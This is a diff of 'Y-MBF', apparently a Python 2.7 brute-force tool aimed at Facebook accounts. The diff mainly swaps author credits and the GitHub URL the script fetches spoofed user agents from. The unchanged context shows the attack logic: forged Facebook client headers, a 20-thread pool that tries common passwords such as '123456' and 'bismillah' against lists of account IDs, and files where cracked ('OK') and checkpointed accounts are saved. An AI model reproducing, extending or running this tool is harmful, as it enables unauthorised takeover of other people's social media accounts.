@@ -4,16 +4,21 @@
 #######################################################
 # Name           : Y-MBF (MBF) <token method>         #
 # File           : ymbf.py                            #
-# Author         : ARIS.MUNANDAR30.
-# Github         : git clone https://github.com/Dru-Crack22/simbfb23       #
-# Facebook       : https://www.facebook.com/ARIS.MUNANDAR30   #
-# Instagram      : https://www.instagram.com/nikipratama307/ #git clone https://github.com/Dru-Crack22/simbfb23
-# Fansfage       : https://www.facebook.com/ARIS.MUNANDAR30  #
+# Author         : Moch Yayan Juan Alvredo XD.        #
+# Github         : https://github.com/Yayan-XD        #
+# Facebook       : https://www.facebook.com/KM39453   #
+# Instagram      : https://www.instagram.com/yayanxd_ #
+# Fansfage       : https://www.facebook.com/Yayanxyz  #
 # Blogspot       : https://squadcyberpeopleteam.blogspot.com #
 # Python version : 2.7                                #
 #######################################################
 
-            ## 
+            ##   RATU ERROR PROJECTS   ##
+# Thanks for : Angga,Azim,Dapunta,Rizal,Hamzah,Jesicca,Iqbal,Yayan #
+####################################################################
+
+
+   ############# JANGAN DI UBAH ASU NANTI ERROR! #############
 
 import os
 try:
@@ -730,7 +735,7 @@ class __crack__:
             try:
             	user_agent = open('YNTKTS.txt', 'r').read()
             except (KeyError, IOError):
-            	user_agent = requests.get('https://raw.githubusercontent.com/YARISMUNANDAR30/main/data/user_agent.txt').text.strip()
+            	user_agent = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
             except: pass
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
                'x-fb-net-hni': str(random.randint(20000, 40000)), 
@@ -917,7 +922,7 @@ class __crack__:
             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-            with ARISGanteng(max_workers=20) as (__ARISMUNANDAR30__):
+            with YayanGanteng(max_workers=20) as (__yayanXD__):
             	for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         bb = yntks.split('<=>')
@@ -995,8 +1000,7 @@ class __crack__:
                         		'sayang', 'anjing',
                         		'bismillah', '123456'
                         	]
-                        __
-                    __.submit(self.__mfb__, bb[0], raimuuu)
+                        __yayanXD__.submit(self.__mfb__, bb[0], raimuuu)
                     except:
                         pass
 
